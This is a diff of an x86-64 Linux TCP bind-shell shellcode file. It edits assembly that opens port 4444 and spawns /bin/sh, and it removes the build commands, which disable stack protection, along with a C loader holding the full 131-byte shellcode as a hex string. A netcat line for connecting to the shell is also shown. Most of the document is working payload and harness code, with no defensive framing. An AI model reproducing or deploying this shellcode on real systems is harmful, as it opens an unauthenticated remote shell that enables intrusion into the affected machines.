@@ -1,7 +1,7 @@
-/*
+
 test = after you run the shellcode open another terminal an run 'netcat -vv 0.0.0.0 4444'
-================== ASSEMBLY ========================================
-//shellcode contains 131 bytes
+
+;shellcode contains 131 bytes
 
 global _start
 
@@ -102,7 +102,7 @@ spawn_shell:
 	add al,		59			;sys_execve
 	xor rdi,	rdi			;set rdi to zero
 	push rdi				;push null on the stack
-	mov rdi,	0x68732F2f6e69622F	;bin//sh in reverse
+	mov rdi,	0x68732F2f6e69622F	;/bin//sh in reverse
 	push rdi				
 	mov rdi,	rsp			;set stack pointer to rdi
 	xor rsi,	rsi			;rsi and rdx == 0
@@ -111,40 +111,9 @@ spawn_shell:
 
 
 
-=======Generate Shellcode==========================================
-nasm -felf64 tcp_bind.nasm -o tcp_bind.o 
-ld tcp_bind.o -o tcp_bind
 
 
-=========generate C program to exploit=============================
-gcc -fno-stack-protector -z execstack bind.c -o bind
 
-
-======================C program=====================================
-*/
-#include <stdio.h>
-#include <string.h>
-
-unsigned char shellcode[]=\
-        "\x48\x31\xf6\x6a\x29\x58\x6a\x02\x5f\x48\xff\xc6\x48"
-        "\x31\xd2\x0f\x05\x48\x97\x48\x31\xc0\x50\x50\x66\xc7"
-        "\x44\x24\x02\x11\x5c\xc6\x04\x24\x02\x48\x31\xd2\x6a"
-        "\x31\x58\x54\x5e\x48\x83\xc2\x10\x0f\x05\x48\x31\xf6"
-        "\x6a\x32\x58\x48\xff\xc6\x0f\x05\x6a\x2b\x58\x48\x89"
-        "\xe6\xc6\x44\x24\xff\x10\x48\xff\xcc\x48\x89\xe2\x0f"
-        "\x05\x49\x92\x6a\x03\x58\x50\x0f\x05\x49\x87\xfa\x5e"
-        "\x6a\x21\x58\x48\xff\xce\x0f\x05\xe0\xf6\x31\xc0\x04"
-        "\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f"
-        "\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05";
-
-int main(){
-
-        printf("length of your shellcode is: %d\n", (int)strlen(shellcode));
-
-        int (*ret)() = (int(*)())shellcode;
-
-        ret();
-}
 
 
 
